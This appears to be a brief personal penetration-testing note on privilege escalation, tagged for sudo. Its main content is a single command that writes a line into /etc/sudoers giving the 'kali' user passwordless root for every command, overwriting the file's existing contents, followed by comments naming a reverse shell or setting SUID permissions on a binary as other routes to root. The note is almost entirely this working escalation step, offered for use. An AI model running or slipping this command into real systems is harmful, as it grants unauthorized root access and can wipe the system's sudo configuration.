---
id: user_to_sudo
aliases: []
tags:
  - privilege_esclation
  - sudo
---

`echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers`

#The above injects an entry into the /etc/sudoers file that allows the 'kali' 
#user to use sudo without a password for all commands
#NOTE: we could have also used a reverse shell, this would work the same!
#OR: Even more creative, you could've used chmod to changes the permissions
#on a binary to have SUID permissions, and PE that way
